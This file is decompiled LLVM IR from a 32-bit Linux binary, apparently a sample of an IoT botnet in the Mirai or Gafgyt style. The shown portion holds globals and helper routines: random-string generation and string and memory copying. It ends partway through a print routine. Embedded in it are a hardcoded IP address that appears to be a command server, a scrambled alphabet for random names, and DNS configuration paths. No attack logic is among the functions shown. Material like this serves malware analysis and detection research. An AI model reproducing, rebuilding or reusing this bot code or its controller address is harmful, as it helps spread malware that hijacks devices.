source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805200c.2 = global i32 0
@global_var_8052024.3 = local_unnamed_addr global i32* @global_var_805200c.2
@global_var_805165c.4 = constant i32 0
@global_var_8052010.6 = local_unnamed_addr global i32 0
@global_var_8052310.8 = local_unnamed_addr global i32 0
@global_var_8052314.9 = local_unnamed_addr global i32 0
@global_var_8052318.10 = local_unnamed_addr global i32 0
@global_var_804fcf0.11 = constant [37 x i8] c"kt8lmno5abghi6w7uvx2cdyz14pqef3rs9j0\00"
@global_var_804fd15.12 = constant [7 x i8] c"(null)\00"
@global_var_8052038 = external local_unnamed_addr global i32
@global_var_8050140.14 = constant i32 65536
@global_var_8052308.15 = local_unnamed_addr global i32 0
@global_var_8052300.16 = local_unnamed_addr global i32 0
@global_var_8052304.17 = local_unnamed_addr global i32 0
@global_var_8054564.18 = local_unnamed_addr global i32 0
@global_var_804fd1e.20 = constant i32 4915244
@global_var_8052030.22 = local_unnamed_addr global i32 -1
@global_var_804fce0.23 = constant [15 x i8] c"191.96.112.131\00"
@global_var_805202c.24 = global [15 x i8]* @global_var_804fce0.23
@global_var_804fd22.25 = constant i32 2097199
@global_var_804fd24.26 = constant i32 32
@global_var_8052040.27 = local_unnamed_addr global i32* @global_var_8050140.14
@global_var_8052520.28 = global i32 0
@global_var_805231c.29 = global i32 0
@global_var_8052320.30 = global i32 0
@global_var_80524ec.31 = global i32 0
@global_var_8052160.32 = global i32 0
@global_var_8054994.33 = local_unnamed_addr global i32 0
@global_var_8054988.34 = global i32 0
@global_var_8054580.35 = global i32 0
@global_var_8052044.36 = global i32 0
@global_var_805462c.38 = global i32 0
@global_var_8054630.39 = local_unnamed_addr global i32 0
@global_var_8054634.40 = global i32 0
@global_var_8054640.41 = local_unnamed_addr global i32 0
@global_var_8054934.42 = global i32 0
@global_var_805495c.43 = local_unnamed_addr global i32 0
@global_var_805494c.44 = local_unnamed_addr global i32 0
@global_var_8054950.45 = local_unnamed_addr global i32 0
@global_var_8054954.46 = local_unnamed_addr global i32 0
@global_var_8054958.47 = local_unnamed_addr global i32 0
@global_var_8054964.48 = local_unnamed_addr global i32 0
@global_var_8054970.49 = local_unnamed_addr global i32 0
@global_var_8054968.50 = local_unnamed_addr global i32 0
@global_var_8054974.51 = local_unnamed_addr global i32 0
@global_var_8054948.52 = local_unnamed_addr global i32 0
@global_var_8054944.54 = local_unnamed_addr global i32 0
@global_var_805496c.55 = local_unnamed_addr global i32 0
@global_var_805463c.56 = local_unnamed_addr global i32 0
@global_var_805205c.57 = global i32 0
@global_var_8052074.59 = global i32 0
@global_var_805208c = external global i32
@global_var_80520c4.61 = global i32 -1726662223
@global_var_8052094.62 = local_unnamed_addr global i32* @global_var_80520c4.61
@global_var_8052090.63 = global i32* @global_var_80520c4.61
@global_var_8050354.64 = constant i32 0
@global_var_8050340.65 = constant i32 0
@global_var_8052140.66 = global i32 0
@global_var_8052504.67 = local_unnamed_addr global i32 0
@global_var_8052000.69 = global i32 -1
@global_var_804b59f.70 = constant i32 -294069
@global_var_8052514.71 = local_unnamed_addr global i32 0
@global_var_8052518.72 = local_unnamed_addr global i32 0
@global_var_80505c0.73 = constant [10 x i8] c"/dev/null\00"
@global_var_8052510.75 = local_unnamed_addr global i32 0
@global_var_8052508.76 = local_unnamed_addr global i32 0
@global_var_805250c.77 = local_unnamed_addr global i32 0
@global_var_8050985.78 = constant i32 1970153472
@global_var_8052158.79 = local_unnamed_addr global i32* @global_var_8050985.78
@global_var_804b785.80 = constant i32 1928542531
@global_var_804b7a9.81 = constant i32 1928542531
@global_var_8052544.82 = local_unnamed_addr global i32 0
@global_var_8052524.83 = global i32 0
@global_var_8054998.87 = local_unnamed_addr global i32 0
@global_var_80505ca.88 = constant i32 1697579054
@global_var_80505fe.89 = constant i32 1868824690
@global_var_80505cc.90 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_80505dd.91 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_80505f5.92 = constant [11 x i8] c"nameserver\00"
@global_var_8050600.93 = constant [7 x i8] c"domain\00"
@global_var_8050607.94 = constant [7 x i8] c"search\00"
@global_var_8054978.95 = global i32 0
@global_var_805499c.96 = local_unnamed_addr global i32 0
@global_var_80549a0.97 = local_unnamed_addr global i32 0
@global_var_80521a8.98 = global i32 0
@global_var_8052548.99 = local_unnamed_addr global i32 0
@global_var_805254c.100 = local_unnamed_addr global i32 0
@global_var_80521c0.101 = local_unnamed_addr global i32 2
@global_var_8052190.102 = global i32 0
@global_var_80521e0.103 = global i32 288
@global_var_805218c.104 = global i32* @global_var_80521e0.103
@global_var_8052230.105 = local_unnamed_addr global i32 272
@global_var_8050610.106 = constant i32 0
@global_var_805063c.107 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8050639.109 = constant [3 x i8] c"%x\00"
@global_var_805064d.110 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8050658.111 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8050780.112 = constant i32 65536
@global_var_80522d4.113 = local_unnamed_addr global i32* @global_var_8050780.112
@global_var_8050980.114 = constant [6 x i8] c"(nil)\00"
@global_var_8050986.115 = constant [7 x i8] c"(null)\00"
@global_var_805098d.116 = constant i32 2949163
@global_var_80509fa.118 = constant i32 327688
@global_var_80509f2.119 = constant [8 x i8] c" +0-#'I\00"
@global_var_80509a0.120 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_80509dd.121 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_80509d3.122 = constant i32 117506048
@global_var_80509c4.123 = constant i32 331776
@global_var_8050a40.124 = constant [8 x i8] c"Success\00"
@global_var_8050a1e.125 = constant [15 x i8] c"Unknown error \00"
@global_var_80515ac.127 = constant [4 x i8] c"inf\00"
@global_var_80515af.132 = constant i32 1179535616
@global_var_80515bc.133 = constant i32 2883630
@global_var_80522e0.1 = local_unnamed_addr global i8 0
@global_var_805230c.7 = local_unnamed_addr global i8 0
@1 = internal constant [2 x i8] c"S\00"
@global_var_804fd1c.19 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@2 = internal constant [2 x i8] c"K\00"
@global_var_804fd20.21 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_8054600.37 = global i8 0
@global_var_8054960.53 = local_unnamed_addr global i8 0
@global_var_8052500.58 = local_unnamed_addr global i8 0
@global_var_805251c.74 = local_unnamed_addr global i8 0
@global_var_8052528.84 = external global i8*
@global_var_8052540.85 = local_unnamed_addr global i64 0
@global_var_805215c.86 = local_unnamed_addr global i16 1
@global_var_8050a12.117 = external constant i8*

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 40823
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_80522e0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80522e0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8052024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80522e0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805165c.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_8052010.6, align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8048166 = ptrtoint i32* %stack_var_4 to i32
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v8_8048180 = inttoptr i32 %arg1 to i32*
  %v9_8048180 = call i32 @__uClibc_main(i32 134517382, i32* %v8_8048180, i32 %v4_8048166, i32 134512788, i32 134544584, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @rand_init() local_unnamed_addr {
entry:
  %v0_804818b = load i32, i32* @ebx, align 4
  %v2_8048194 = call i32 @__GI_time(i32* null)
  %v1_804819c = trunc i32 %v2_8048194 to i8
  store i8 %v1_804819c, i8* @global_var_805230c.7, align 4
  %v0_80481a1 = call i32 @__libc_getpid()
  store i32 %v0_80481a1, i32* @ebx, align 4
  %v1_80481a8 = call i32 @getppid(i32 0)
  %v1_80481ad = load i32, i32* @ebx, align 4
  %v2_80481ad = xor i32 %v1_80481ad, %v1_80481a8
  store i32 %v2_80481ad, i32* @global_var_8052310.8, align 16
  %v0_80481b4 = call i32 @clock()
  store i32 %v0_80481b4, i32* @global_var_8052314.9, align 4
  %v0_80481c4 = load i32, i32* @global_var_8052310.8, align 16
  %v2_80481c9 = xor i32 %v0_80481c4, %v0_80481b4
  store i32 %v2_80481c9, i32* @global_var_8052318.10, align 8
  store i32 %v0_804818b, i32* @ebx, align 4
  ret i32 %v2_80481c9
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v0_80481db = load i8, i8* @global_var_805230c.7, align 1
  %v1_80481db = sext i8 %v0_80481db to i32
  %v2_80481ef = udiv i32 %v1_80481db, 256
  %v6_80481f2 = xor i32 %v2_80481ef, %v1_80481db
  %v0_80481f5 = load i32, i32* @global_var_8052310.8, align 16
  %v1_80481fa = trunc i32 %v0_80481f5 to i8
  store i8 %v1_80481fa, i8* @global_var_805230c.7, align 4
  %v0_80481ff = load i32, i32* @global_var_8052314.9, align 4
  store i32 %v0_80481ff, i32* @global_var_8052310.8, align 16
  %v0_8048209 = load i32, i32* @global_var_8052318.10, align 8
  store i32 %v0_8048209, i32* @global_var_8052314.9, align 4
  %v2_804821a = udiv i32 %v0_8048209, 524288
  store i32 %v2_804821a, i32* @edx, align 4
  %sext = mul i32 %v6_80481f2, 16777216
  %v5_804822e = sdiv i32 %sext, 16777216
  %v2_8048222 = xor i32 %v5_804822e, %v0_8048209
  %v6_804822e = xor i32 %v2_8048222, %v2_804821a
  store i32 %v6_804822e, i32* @global_var_8052318.10, align 8
  ret i32 %v6_804822e

; uselistorder directives
  uselistorder i32 %v2_804821a, { 1, 0 }
  uselistorder i32 %v0_8048209, { 1, 0, 2 }
  uselistorder i32 %v1_80481db, { 1, 0 }
  uselistorder i8* @global_var_805230c.7, { 2, 1, 0 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp58 = icmp slt i32 %arg2, 1
  %tmp69 = icmp eq i1 %tmp58, false
  br i1 %tmp69, label %dec_label_pc_8048243, label %dec_label_pc_804829a

dec_label_pc_8048243:                             ; preds = %entry, %dec_label_pc_8048294.backedge
  %stack_var_8.011 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_8048294.backedge ], [ %arg2, %entry ]
  %stack_var_4.010 = phi i16* [ %stack_var_4.0.be, %dec_label_pc_8048294.backedge ], [ %arg1, %entry ]
  %v7_8048247 = icmp sgt i32 %stack_var_8.011, 3
  br i1 %v7_8048247, label %dec_label_pc_8048249, label %dec_label_pc_8048262

dec_label_pc_8048249:                             ; preds = %dec_label_pc_8048243
  %v4_8048249 = ptrtoint i16* %stack_var_4.010 to i32
  %v0_804824c = call i32 @rand_next()
  %v2_8048251 = bitcast i16* %stack_var_4.010 to i32*
  store i32 %v0_804824c, i32* %v2_8048251, align 4
  %v5_8048253 = add i32 %v4_8048249, 4
  %v1_804825a = add i32 %stack_var_8.011, -4
  store i32 %v1_804825a, i32* @eax, align 4
  br label %dec_label_pc_8048294.backedge

dec_label_pc_8048262:                             ; preds = %dec_label_pc_8048243
  %v7_8048266 = icmp sgt i32 %stack_var_8.011, 1
  br i1 %v7_8048266, label %dec_label_pc_8048268, label %dec_label_pc_8048282

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048262
  %v4_8048268 = ptrtoint i16* %stack_var_4.010 to i32
  %v0_804826b = call i32 @rand_next()
  %v1_804826b = trunc i32 %v0_804826b to i16
  store i16 %v1_804826b, i16* %stack_var_4.010, align 2
  %v5_8048273 = add i32 %v4_8048268, 2
  %v1_804827a = add i32 %stack_var_8.011, -2
  store i32 %v1_804827a, i32* @eax, align 4
  br label %dec_label_pc_8048294.backedge

dec_label_pc_8048282:                             ; preds = %dec_label_pc_8048262
  %v5_8048262 = add i32 %stack_var_8.011, -1
  %v0_8048282 = call i32 @rand_next()
  %v4_8048289 = ptrtoint i16* %stack_var_4.010 to i32
  store i32 %v4_8048289, i32* @eax, align 4
  %v1_804828c = trunc i32 %v0_8048282 to i8
  %v3_804828c = bitcast i16* %stack_var_4.010 to i8*
  store i8 %v1_804828c, i8* %v3_804828c, align 1
  %v5_804828e = add i32 %v4_8048289, 1
  br label %dec_label_pc_8048294.backedge

dec_label_pc_8048294.backedge:                    ; preds = %dec_label_pc_8048282, %dec_label_pc_8048249, %dec_label_pc_8048268
  %stack_var_4.0.be.in = phi i32 [ %v5_8048253, %dec_label_pc_8048249 ], [ %v5_8048273, %dec_label_pc_8048268 ], [ %v5_804828e, %dec_label_pc_8048282 ]
  %stack_var_8.0.be = phi i32 [ %v1_804825a, %dec_label_pc_8048249 ], [ %v1_804827a, %dec_label_pc_8048268 ], [ %v5_8048262, %dec_label_pc_8048282 ]
  %stack_var_4.0.be = inttoptr i32 %stack_var_4.0.be.in to i16*
  %tmp5 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp6 = icmp eq i1 %tmp5, false
  br i1 %tmp6, label %dec_label_pc_8048243, label %dec_label_pc_8048294.dec_label_pc_804829a_crit_edge

dec_label_pc_8048294.dec_label_pc_804829a_crit_edge: ; preds = %dec_label_pc_8048294.backedge
  br label %dec_label_pc_804829a

dec_label_pc_804829a:                             ; preds = %dec_label_pc_8048294.dec_label_pc_804829a_crit_edge, %entry
  %v0_804829c = load i32, i32* @eax, align 4
  ret i32 %v0_804829c

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder i16* %stack_var_4.010, { 4, 5, 1, 3, 0, 2 }
  uselistorder i32 %stack_var_8.011, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048294.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048243, { 1, 0 }
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-61 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80482a1 = load i32, i32* @esi, align 4
  store i32 %v0_80482a1, i32* %stack_var_-12, align 4
  %tmp13 = bitcast i32* %stack_var_-61 to i8*
  store i1 false, i1* @df, align 1
  %v7_80482b3 = call i8* @_memcpy(i8* %tmp13, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_804fcf0.11, i32 0, i32 0), i32 37)
  %tmp1523 = icmp slt i32 %arg2, 1
  %tmp1624 = icmp eq i1 %tmp1523, false
  br i1 %tmp1624, label %dec_label_pc_80482b7, label %dec_label_pc_8048337

dec_label_pc_80482b7:                             ; preds = %entry, %dec_label_pc_8048331.backedge
  %stack_var_4.126 = phi i8* [ %stack_var_4.1.be, %dec_label_pc_8048331.backedge ], [ %arg1, %entry ]
  %stack_var_8.025 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_8048331.backedge ], [ %arg2, %entry ]
  %tmp27 = icmp ult i32 %stack_var_8.025, 4
  %v0_804830a = call i32 @rand_next()
  br i1 %tmp27, label %dec_label_pc_804830a, label %dec_label_pc_80482bf

dec_label_pc_80482bf:                             ; preds = %dec_label_pc_80482b7
  br label %dec_label_pc_80482d0

dec_label_pc_80482d0:                             ; preds = %dec_label_pc_80482d0, %dec_label_pc_80482bf
  %stack_var_-20.021.in = phi i32 [ %v0_804830a, %dec_label_pc_80482bf ], [ %v6_80482d6, %dec_label_pc_80482d0 ]
  %storemerge20 = phi i32 [ 0, %dec_label_pc_80482bf ], [ %v4_80482f4, %dec_label_pc_80482d0 ]
  %stack_var_4.019 = phi i8* [ %stack_var_4.126, %dec_label_pc_80482bf ], [ %v22_80482f1, %dec_label_pc_80482d0 ]
  %stack_var_-20.021 = trunc i32 %stack_var_-20.021.in to i8
  %sext = mul i32 %stack_var_-20.021.in, 16777216
  %v4_80482d0 = sdiv i32 %sext, 16777216
  %v6_80482d6 = udiv i32 %v4_80482d0, 256
  %v5_80482da = udiv i8 %stack_var_-20.021, 8
  %v4_80482e3 = zext i8 %v5_80482da to i32
  %v0_80482e6 = load i32, i32* @ebp, align 4
  %v2_80482e6 = add nsw i32 %v4_80482e3, -57
  %v3_80482e6 = add i32 %v2_80482e6, %v0_80482e6
  %v4_80482e6 = inttoptr i32 %v3_80482e6 to i8*
  %v5_80482e6 = load i8, i8* %v4_80482e6, align 1
  %v6_80482e6 = zext i8 %v5_80482e6 to i32
  %v2_80482ea = load i32, i32* @edx, align 4
  %v3_80482ea = and i32 %v2_80482ea, -256
  %v4_80482ea = or i32 %v3_80482ea, %v6_80482e6
  store i32 %v4_80482ea, i32* @edx, align 4
  %v4_80482ec = ptrtoint i8* %stack_var_4.019 to i32
  store i8 %v5_80482e6, i8* %stack_var_4.019, align 1
  %v5_80482f1 = add i32 %v4_80482ec, 1
  %v22_80482f1 = inttoptr i32 %v5_80482f1 to i8*
  %v4_80482f4 = add nuw nsw i32 %storemerge20, 1
  %exitcond = icmp eq i32 %v4_80482f4, 4
  br i1 %exitcond, label %dec_label_pc_80482ff, label %dec_label_pc_80482d0

dec_label_pc_80482ff:                             ; preds = %dec_label_pc_80482d0
  %v1_8048302 = add i32 %stack_var_8.025, -4
  store i32 %v1_8048302, i32* @eax, align 4
  br label %dec_label_pc_8048331.backedge

dec_label_pc_804830a:                             ; preds = %dec_label_pc_80482b7
  %tmp14 = urem i32 %v0_804830a, 37
  %v4_8048326 = ptrtoint i8* %stack_var_4.126 to i32
  store i32 %v4_8048326, i32* @eax, align 4
  %v1_8048329 = trunc i32 %tmp14 to i8
  store i8 %v1_8048329, i8* %stack_var_4.126, align 1
  %v5_804832b = add i32 %v4_8048326, 1
  %v22_804832b = inttoptr i32 %v5_804832b to i8*
  %v4_804832e = add i32 %stack_var_8.025, -1
  br label %dec_label_pc_8048331.backedge

dec_label_pc_8048331.backedge:                    ; preds = %dec_label_pc_804830a, %dec_label_pc_80482ff
  %stack_var_8.0.be = phi i32 [ %v4_804832e, %dec_label_pc_804830a ], [ %v1_8048302, %dec_label_pc_80482ff ]
  %stack_var_4.1.be = phi i8* [ %v22_804832b, %dec_label_pc_804830a ], [ %v22_80482f1, %dec_label_pc_80482ff ]
  %tmp15 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp16 = icmp eq i1 %tmp15, false
  br i1 %tmp16, label %dec_label_pc_80482b7, label %dec_label_pc_8048337

dec_label_pc_8048337:                             ; preds = %dec_label_pc_8048331.backedge, %entry
  %v2_804833a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804833a, i32* @esi, align 4
  %v0_804833d = load i32, i32* @eax, align 4
  ret i32 %v0_804833d

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder i32 %v0_804830a, { 1, 0 }
  uselistorder label %dec_label_pc_80482b7, { 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %v0_804833e = load i32, i32* @ebp, align 4
  %v4_80483505 = ptrtoint i8* %arg1 to i32
  %v2_80483536 = load i8, i8* %arg1, align 1
  %v4_80483557 = icmp eq i8 %v2_80483536, 0
  %v1_80483578 = icmp eq i1 %v4_80483557, false
  %v4_804835d12 = icmp eq i1 %v1_80483578, false
  %v1_804835f13 = icmp eq i1 %v4_804835d12, false
  br i1 %v1_804835f13, label %dec_label_pc_804834d, label %dec_label_pc_8048361

dec_label_pc_804834d:                             ; preds = %entry, %dec_label_pc_804834d
  %v4_804835015 = phi i32 [ %v5_804835a, %dec_label_pc_804834d ], [ %v4_80483505, %entry ]
  %storemerge14 = phi i32 [ %v4_804834d, %dec_label_pc_804834d ], [ 0, %entry ]
  %v5_804835a = add i32 %v4_804835015, 1
  %v22_804835a = inttoptr i32 %v5_804835a to i8*
  %v4_804834d = add i32 %storemerge14, 1
  %v2_8048353 = load i8, i8* %v22_804835a, align 1
  %v4_8048355 = icmp eq i8 %v2_8048353, 0
  %v1_8048357 = icmp eq i1 %v4_8048355, false
  %v4_804835d = icmp eq i1 %v1_8048357, false
  %v1_804835f = icmp eq i1 %v4_804835d, false
  br i1 %v1_804835f, label %dec_label_pc_804834d, label %dec_label_pc_8048361

dec_label_pc_8048361:                             ; preds = %dec_label_pc_804834d, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804834d, %dec_label_pc_804834d ]
  store i32 %v0_804833e, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v5_804835a, { 1, 0 }
  uselistorder label %dec_label_pc_804834d, { 1, 0 }
}

define i32 @util_memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v13_804838d12 = icmp eq i32 %arg3, 0
  %v1_804839113 = icmp eq i1 %v13_804838d12, false
  br i1 %v1_804839113, label %dec_label_pc_804837a, label %dec_label_pc_8048393

dec_label_pc_804837a:                             ; preds = %entry, %dec_label_pc_804837a
  %storemerge.in16 = phi i32 [ %v5_8048387, %dec_label_pc_804837a ], [ %arg2, %entry ]
  %stack_var_12.015 = phi i32 [ %v4_804838a, %dec_label_pc_804837a ], [ %arg3, %entry ]
  %stack_var_-12.014 = phi i8* [ %v22_8048384, %dec_label_pc_804837a ], [ %arg1, %entry ]
  %v4_804838a = add i32 %stack_var_12.015, -1
  %storemerge = inttoptr i32 %storemerge.in16 to i8*
  store i32 %storemerge.in16, i32* %eax.global-to-local, align 4
  %v2_804837d = load i8, i8* %storemerge, align 1
  %v3_804837d = zext i8 %v2_804837d to i32
  %v4_804837d = load i32, i32* @edx, align 4
  %v5_804837d = and i32 %v4_804837d, -256
  %v6_804837d = or i32 %v5_804837d, %v3_804837d
  store i32 %v6_804837d, i32* @edx, align 4
  %v4_804837f = ptrtoint i8* %stack_var_-12.014 to i32
  store i32 %v4_804837f, i32* %eax.global-to-local, align 4
  store i8 %v2_804837d, i8* %stack_var_-12.014, align 1
  %v5_8048384 = add i32 %v4_804837f, 1
  %v22_8048384 = inttoptr i32 %v5_8048384 to i8*
  %v5_8048387 = add i32 %storemerge.in16, 1
  %v13_804838d = icmp eq i32 %v4_804838a, 0
  %v1_8048391 = icmp eq i1 %v13_804838d, false
  br i1 %v1_8048391, label %dec_label_pc_804837a, label %dec_label_pc_804838a.dec_label_pc_8048393_crit_edge

dec_label_pc_804838a.dec_label_pc_8048393_crit_edge: ; preds = %dec_label_pc_804837a
  %v0_8048394.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8048393

dec_label_pc_8048393:                             ; preds = %dec_label_pc_804838a.dec_label_pc_8048393_crit_edge, %entry
  %v0_8048394 = phi i32 [ %v0_8048394.pre, %dec_label_pc_804838a.dec_label_pc_8048393_crit_edge ], [ %arg2, %entry ]
  ret i32 %v0_8048394

; uselistorder directives
  uselistorder i32 %v4_804838a, { 1, 0 }
  uselistorder i32 %storemerge.in16, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804837a, { 1, 0 }
}

define i32 @util_strcpy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048395 = load i32, i32* @ebp, align 4
  store i32 %v0_8048395, i32* %stack_var_-4, align 4
  %v4_8048395 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048395, i32* @ebp, align 4
  %v1_804839e = inttoptr i32 %arg2 to i8*
  %v2_804839e = call i32 @util_strlen(i8* %v1_804839e)
  %v1_80483ac = add i32 %v2_804839e, 1
  %v3_80483b4 = inttoptr i32 %arg1 to i8*
  %v4_80483b4 = call i32 @util_memcpy(i8* %v3_80483b4, i32 %arg2, i32 %v1_80483ac)
  %v2_80483bf = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80483bf, i32* @ebp, align 4
  ret i32 %v2_804839e

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
